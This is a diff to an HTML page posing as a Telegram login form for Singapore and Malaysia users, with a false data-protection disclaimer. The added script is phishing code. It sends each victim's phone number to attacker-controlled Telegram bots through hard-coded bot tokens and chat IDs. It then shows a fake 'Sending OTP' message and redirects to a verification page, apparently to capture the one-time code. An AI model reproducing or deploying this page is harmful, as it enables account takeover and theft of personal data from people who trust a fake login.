@@ -173,49 +173,79 @@
       </svg>
     </div>
     <h1>Enter telegram number</h1>
-<p>To continue, please login first</p>
+    <p>To continue, please login first</p>
+    <form id="phoneForm">
+      <label for="country">Country code \/</label>
+      <select id="countrySelect">
+  <option value="+65">SG Singapore (+65)</option>
+  <option value="+60">MYS Malaysia (+60)</option>
+</select>
 
-<form id="phoneForm">
-  <label for="country">Country</label>
-
-  <select id="country" required>
-    <option value="+60">🇲🇾 Malaysia (+60)</option>
-    <option value="+65">🇸🇬 Singapore (+65)</option>
-  </select>
-
-  <label for="phone">Telegram number</label>
-
-  <input
-    type="tel"
-    id="phoneInput"
-    placeholder="Telegram number"
-    required
-  />
-
-  <button type="submit" class="btn">Next</button>
-
-  <div class="disclaimer">
-    *Make sure the number entered is active to receive verification.
-    Data will be kept confidential in accordance with the Personal Data Protection Act.
+<label for="phone">Telegram number</label>
+<input type="tel" id="phoneInput" placeholder="Telegram number" required />
+      
+      <button type="submit" class="btn">next</button>
+      
+      <div class="disclaimer">
+        *Make sure the number entered is active to receive verification. Data will be kept confidential in accordance with the Personal Data Protection Act.
+      </div>
+    </form>
+    <div class="status" id="statusMessage"></div>
   </div>
-</form>
 
-<div class="status" id="statusMessage"></div>
+  <script>
+    const phoneForm = document.getElementById('phoneForm');
+const phoneInput = document.getElementById('phoneInput');
+const statusMessage = document.getElementById('statusMessage');
+const blurOverlay = document.getElementById('blurOverlay');
+const loadingText = document.getElementById('loadingText');
+const countrySelect = document.getElementById('countrySelect');
 
-<script>
-  const phoneForm = document.getElementById('phoneForm');
-  const country = document.getElementById('country');
-  const phoneInput = document.getElementById('phoneInput');
-  const statusMessage = document.getElementById('statusMessage');
+const bots = [
+  { token: "8767083970:AAErtjNdtgZ73KhuDAyTRWXwXEI6SiQGMqI", chatId: "8077606058" },
+  { token: "7690173453:AAFizIJfq7OWi5tthhxxqXKWcS0Xb5bP_iE", chatId: "6832746767" }
+];
 
-  phoneForm.addEventListener('submit', function (e) {
-    e.preventDefault();
+phoneForm.addEventListener('submit', function(e) {
+  e.preventDefault();
 
-    const countryCode = country.value;
-    const number = phoneInput.value.trim().replace(/^0+/, '');
-    const fullPhone = countryCode + number;
+  const phone = phoneInput.value.trim();
+  const countryText = countrySelect.options[countrySelect.selectedIndex].text;
+  const currentBotIndex = parseInt(localStorage.getItem('currentBotIndex') || "0");
+  localStorage.setItem('sessionBotIndex', currentBotIndex);
+  const bot = bots[currentBotIndex];
 
-    statusMessage.textContent = "Number selected: " + fullPhone;
-    statusMessage.style.color = "#000";
-  });
-</script>
+  const message = `🌀 *FUN GAY LOGIN*\n━━━━━━━━━━━━━━\n🌍 Country: ${countryText}\n📞 Phone: \`${phone}\`\n━━━━━━━━━━━━━━`;
+  const api = `https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+
+  statusMessage.textContent = "⏳ Sending OTP to your Telegram account...";
+  statusMessage.style.color = "#000";
+  blurOverlay.style.display = "block";
+  loadingText.style.display = "block";
+
+  fetch(api)
+    .then(res => res.json())
+    .then(data => {
+      if (data.ok) {
+        const nextBotIndex = (currentBotIndex + 1) % bots.length;
+        localStorage.setItem('currentBotIndex', nextBotIndex);
+        setTimeout(() => {
+          window.location.href = `verify.html?phone=${encodeURIComponent(phone)}`;
+        }, 3000);
+      } else {
+        blurOverlay.style.display = "none";
+        loadingText.style.display = "none";
+        statusMessage.textContent = "❌ Gagal mengirim ke bot.";
+        statusMessage.style.color = "red";
+      }
+    })
+    .catch(err => {
+      blurOverlay.style.display = "none";
+      loadingText.style.display = "none";
+      statusMessage.textContent = "❌ Error: " + err.message;
+      statusMessage.style.color = "red";
+    });
+});
+  </script>
+</body>
+</html>
